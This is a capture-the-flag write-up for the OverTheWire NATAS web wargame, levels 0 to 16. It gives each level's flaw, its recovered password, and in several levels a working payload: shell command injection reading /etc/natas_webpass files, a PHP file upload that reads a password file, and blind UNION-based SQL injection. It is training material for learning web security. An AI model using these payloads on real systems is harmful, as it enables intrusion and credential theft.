# OverTheWire – NATAS Write‑up (Level 0 - 16)

---

## Level 0 - 1



* Viewing page source reveals the password inside a comment.

**Password:**

```
0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
```

---

## Level 1 - 2



* Right-click disabled, but source code still accessible using `Ctrl+U`.

**Password:**

```
TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
```

---

## Level 2 - 3

* Image source referenced as:

  ```html
  <img src="files/pixel.png">
  ```
* Navigating to `/files/` directory reveals internal files.

**Password:**

```
3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
```

---

## Level 3 - 4


* `robots.txt` publicly accessible.
* Disallowed path `/s3crt` contained the password.

**Password:**

```
QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

---

## Level 4 - 5


* Server validates access using HTTP `Referer`.
* Changing Referer header grants access.

**Password:**

```
0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```

---

## Level 5 - 6


* Authentication controlled by cookie value.
* Modifying cookie grants access.


* Authentication vs Authorization
verifies who you are,determines what you can do after logging in
* Security misconfiguration

**Password:**

```
0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

---

## Level 6 - 7



* Password file stored in a web-accessible path.
* Included files directly accessible over HTTP.

**Password:**

```
bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```

---

## Level 7 - 8

**Finding:**

* File included without proper sanitization.
* user can unclude the file path and get the file
* parameter was controlled
* sqli

**Password:**

```
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```

---

## Level 8 - 9

**Finding:**

* Encoded value found in page source.
* Decoding reveals the password.

**Password:**

```
ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```

---

## Level 9 - 10


* Input passed to shell command without sanitization.
* `;` used as command separator.

**Payload:**

```
; cat /etc/natas_webpass/natas10
```

**Password:**

```
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```

---

## Level 10 - 11

**Finding:**

* `grep -i` used but wildcards not filtered.
* `.*` allows reading sensitive files.

**Payload:**

```
.* /etc/natas_webpass/natas11
```

**Password:**

```
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```

---

## Level 11 - 12

* Cookie base64 decoded to XOR cipher.
* url decode from base64 you get the cipher
* Cleartext:json

```
{"showpassword":"no","bgcolor":"#ffffff"}
```

* Modified using XOR and re-encoded.

**Password:**

```
yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```

---

## Level 12 - 13


* HTTP request modified.
* Uploaded PHP file instead of image.
* Converted inputed type into a .php 

**Payload:in file**

```php
<?php
echo file_get_contents("/etc/natas_webpass/natas13");
?>
```

**Password:**

```
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

---

## Level 13 - 14

**Password:**

```
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```

---

## Level 14 - 15

* Login query vulnerable to SQLi.

**Payload:**

```
namashivaya "OR 1=1 ;#
```

**Password:**

```
SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```

---

## Level 15 - 16



* Used `UNION ALL` and `INFORMATION_SCHEMA`.
* Extracted table and column names character-by-character.

**Used Payloads:**

```sql
namashivaya "UNION ALL select 1,2 FROM INFORMATION_SCHEMA.tables WHERE table_schema != "mysql" AND table_schema != "information_schema" 
AND table_schema != "performance_schema" AND substring(table_name, 1,1) = "u";#

```
* gets the table name as "users"

```sql
namashivaya "UNION ALL select 1,2 FROM INFORMATION_SCHEMA.columns WHERE table_name = "users" AND substring(column_name,1,1) = "u";#
```
* username,password
```sql
namashivaya" UNION ALL SELECT 1,2 FROM users WHERE username = "natas16" AND BINARY substring(password,1,1) = "a" LIMIT 1 ;#
```
* limit-Return only one row prevent extra result and error
* 
**Password:**

```
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```

---
